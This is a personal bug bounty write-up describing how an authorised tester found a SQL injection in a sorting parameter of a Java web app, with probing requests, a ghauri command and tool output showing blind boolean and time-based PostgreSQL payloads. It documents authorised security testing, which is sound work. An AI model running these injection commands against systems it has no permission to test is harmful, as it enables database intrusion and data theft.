+++
title = "How I Got My First €€€€ Bounty"
date = 2024-06-03
[taxonomies]
categories = ["Bug Bounty"]
tags = ["Bug Bounty", "Infosec", "SQL Injection", "sqlmap"]
+++

I'll share in this write-up how I discovered my first €€€€ bounty.

<!-- more -->

## Disclaimer

**This isn’t meant to teach anything new—just sharing a personal experience.**

### سَلامٌ

At first, I started with basic manual recon because the program's scope was just a set of URLs related to different services, such as:

- `https://ex.admin.service.example.com/`
- `https://ex.service.service.example.com/`
- `https://ex.abc.service.example.com/`

The program also provided credentials to test different roles.

I then browsed the sites while proxying the traffic through Burp and testing the functionalities like a normal user. However, there weren’t any interesting features—except for the sorting functionality. I noticed some intriguing parameters that I had already seen in some *JS* files:

`SelectedSources` and `SelectedTemplateNames`.  

At first, I thought they might fetch data from a database (yeah that makes sense :D), so I decided to test them with special characters, searching for anomalies like `{", ', \}`. When I entered a single quote, I got a `500 HTTP status code (Internal Server Error)`. Adding another single quote returned a `200 HTTP status code (OK)`.

```
https://ex.service.example.com/history?selectedSources=someSources' > 500

https://ex.service.example.com/history?selectedSources=someSources'' > 200
```

Sometimes, I use a backslash to confirm my suspicions. In this case, I got a `400 Bad Request` (since it was a Java app running on Apache Tomcat, the backslash needed to be encoded as `%5c`).

```
https://ex.service.example.com/history?selectedSources=someSources\' > 400
```

After that, I tried running `sqlmap` to extract the database version. Unfortunately, `sqlmap` didn’t retrieve anything except that the DBMS was `PostgreSQL`. However, I didn’t give up—I switched to `ghauri` instead:

```bash

ghauri -u "https://ex.service.example.com/history?selectedSources=someSources" --dbms=postgres --cookie="JSESSIONID=09326D266052B6B0F7E391B7BBD3A284" --dbs
```

**Boom!**

```bash

[09:22:32] [INFO] testing connection to the target URL
Ghauri resumed the following injection point(s) from stored session:                                                                                                                                                                                                                                          
Parameter: selectedSources (GET)                                                                                                                                                                                                             
    Type: boolean-based blind                                                                                                                                                                                                               
    Title: OR boolean-based blind - WHERE or HAVING clause                                                                                                                                                                                  
    Payload: selectedSources=someSources') OR 06690=6690 OR ('04586'='4586                                                                                                                                                                       

    Type: time-based blind                                                                                                                                                                                                                   
    Title: PostgreSQL > 8.1 AND time-based blind (comment)                                                                                                                                                                                  
    Payload: selectedSources=someSources') AND 4564=(SELECT 4564 FROM PG_SLEEP(6)) OR ('04586'='4586                                                                                                                                                                                                                                                                                                                                                                              
[09:22:33] [INFO] testing PostgreSQL
[09:22:34] [INFO] confirming PostgreSQL
[09:22:34] [INFO] the back-end DBMS is PostgreSQL
[09:22:34] [INFO] fetching database names
[09:22:34] [INFO] fetching number of databases
[09:22:51] [INFO] retrieved: 3
[09:26:01] [INFO] retrieved: information_schema
[09:27:51] [INFO] retrieved: pg_catalog
[09:28:57] [INFO] retrieved: public
available databases [3]:
[*] pg_catalog
[*] public
[*] information_schema
```

I reported the vulnerability, and within just one hour, the triager forwarded my report to the company. They quickly acknowledged the issue.

{{ image(src="/main.webp", alt="main", width=600) }}

The next day, the company awarded me a bounty.

{{ image(src="/accepted.webp", alt="accepted", width=600) }}

**Final Thoughts**

Don’t limit yourself to just one tool, technique, or program you don’t fully understand—it will only burn you out. The internet is already full of vulnerabilities waiting to be discovered.

Twitter/X: [https://x.com/MachIaVellill](https://x.com/MachIaVellill)

### سَلامٌ